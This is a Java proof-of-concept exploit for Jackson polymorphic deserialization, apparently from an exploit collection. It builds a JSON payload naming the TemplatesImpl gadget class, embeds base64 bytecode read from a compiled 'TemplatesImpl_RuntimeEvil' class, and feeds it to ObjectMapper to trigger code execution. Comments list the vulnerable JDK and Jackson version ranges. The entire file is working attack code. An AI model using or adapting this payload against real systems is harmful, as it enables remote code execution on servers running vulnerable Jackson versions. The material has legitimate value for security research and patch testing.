package org.exploit.third.jackson;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.unboundid.util.Base64;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
//jdk7u21 or jdk8u20
//Jackson 2.6系列 < 2.6.7.1
//Jackson 2.7系列 < 2.7.9.1
//Jackson 2.8系列 < 2.8.8.1
public class Id_Class_TemplatesImpl {
    public static class Id_Class_Test {
        @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
        public Object object;
    }
    public static void main(String[] args) throws IOException {
        String exp = readClassStr();
        String jsonInput = aposToQuotes("{\"object\":{'@class':'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" +
                "'transletBytecodes':['"+exp+"'],\n" +
                "'transletName':'test',\n" +
                "'outputProperties':{}\n" +
                "}\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        try {
            Id_Class_Test test = mapper.readValue(jsonInput, Id_Class_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }

    public static String readClassStr() throws IOException {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code1);
    }
}
